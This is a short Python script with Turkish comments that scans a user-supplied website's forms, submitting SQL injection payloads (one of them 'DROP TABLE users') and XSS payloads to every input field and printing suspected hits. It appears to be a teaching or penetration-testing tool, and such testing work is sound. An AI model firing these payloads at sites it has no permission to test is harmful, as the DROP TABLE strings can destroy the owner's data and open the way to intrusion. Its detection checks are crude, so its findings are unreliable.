import requests  # HTTP istekleri yapmak için requests kütüphanesini içe aktarıyoruz
from bs4 import BeautifulSoup  # HTML yapısını daha rahat analiz etmek için BeautifulSoup'u içe aktarıyoruz

# SQL Injection ve XSS saldırı örnekleri için payload listesi tanımlıyoruz
sql_injection_payloads = ["' OR '1'='1", "' OR 'a'='a", "'; DROP TABLE users;", "\"; DROP TABLE users; --"]
xss_payloads = ["<script>alert('XSS');</script>", "<img src=x onerror=alert('XSS')>", "<body onload=alert('XSS')>"]

# Güvenlik açıklarını test etmek için ana fonksiyon
def scan_vulnerabilities(url):
    response = requests.get(url)  # URL'ye HTTP GET isteği gönderiyoruz
    soup = BeautifulSoup(response.text, 'html.parser')  # Gelen HTML içeriğini BeautifulSoup ile analiz ediyoruz

    # Formları bulmak için HTML içindeki <form> etiketlerini tarıyoruz
    forms = soup.find_all("form")
    
    # Her form üzerinde tarama yapıyoruz
    for form in forms:
        form_action = form.get("action")  # Formun gönderildiği URL'yi buluyoruz
        form_method = form.get("method", "get").lower()  # Formun GET veya POST metodunu alıyoruz (varsayılan olarak GET)

        target_url = url + form_action  # Hedef URL'yi oluşturuyoruz
        
        # SQL Injection testi
        for payload in sql_injection_payloads:
            data = {}  # Gönderilecek veri sözlüğü
            inputs = form.find_all("input")  # Formdaki tüm giriş elemanlarını buluyoruz
            for input_tag in inputs:
                input_name = input_tag.get("name")  # Giriş elemanının adını alıyoruz
                data[input_name] = payload  # Her bir giriş elemanına SQL payload'u ekliyoruz
            
            # HTTP isteği gönderiyoruz, form GET mi POST mu ona göre istek yapıyoruz
            if form_method == "post":
                result = requests.post(target_url, data=data)
            else:
                result = requests.get(target_url, params=data)
            
            # Yanıt içeriğinde SQL hata mesajı arıyoruz
            if "error" in result.text.lower():
                print(f"[!] SQL Injection açığı bulundu: {target_url} with payload {payload}")
                break  # Bir açık bulunduysa test etmeyi durduruyoruz

        # XSS testi
        for payload in xss_payloads:
            data = {}  # Gönderilecek veri sözlüğü
            inputs = form.find_all("input")  # Formdaki tüm giriş elemanlarını buluyoruz
            for input_tag in inputs:
                input_name = input_tag.get("name")  # Giriş elemanının adını alıyoruz
                data[input_name] = payload  # Her bir giriş elemanına XSS payload'u ekliyoruz
            
            # HTTP isteği gönderiyoruz, form GET mi POST mu ona göre istek yapıyoruz
            if form_method == "post":
                result = requests.post(target_url, data=data)
            else:
                result = requests.get(target_url, params=data)
            
            # Yanıt içeriğinde XSS payload'unu arıyoruz
            if payload in result.text:
                print(f"[!] XSS açığı bulundu: {target_url} with payload {payload}")
                break  # Bir açık bulunduysa test etmeyi durduruyoruz

# Kullanıcıdan URL alıyoruz ve taramayı başlatıyoruz
target_url = input("Tarama yapmak istediğiniz URL'yi girin: ")
scan_vulnerabilities(target_url)  # Tarama fonksiyonunu çağırıyoruz
